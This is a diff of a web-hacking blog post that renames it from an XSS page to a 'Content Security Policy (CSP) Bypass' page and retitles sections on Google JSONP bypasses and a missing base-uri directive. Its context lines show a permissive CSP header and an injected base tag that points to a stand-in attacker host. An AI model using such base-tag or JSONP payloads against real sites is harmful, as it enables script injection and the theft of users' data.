@@ -1,12 +1,12 @@
 ---
-title: XSS(Cross Site Scripting)
+title: Content Security Policy (CSP) Bypass
 author: janger
 date: 2023-09-25
 category: Web Hacking
 layout: post
 ---
 
-## Google JSON API XSS
+## Google JSONP API CSP Bypass
 
 If the target server is accepting addresses from Google, use the
 
@@ -24,7 +24,7 @@ Content-Security-Policy: default-src 'self'; script-src *.google.com
 ~~~
 
 
-## base tag url XSS
+## missing base-uri
 
 ~~~ html
 <base href="https://attacker.io/">
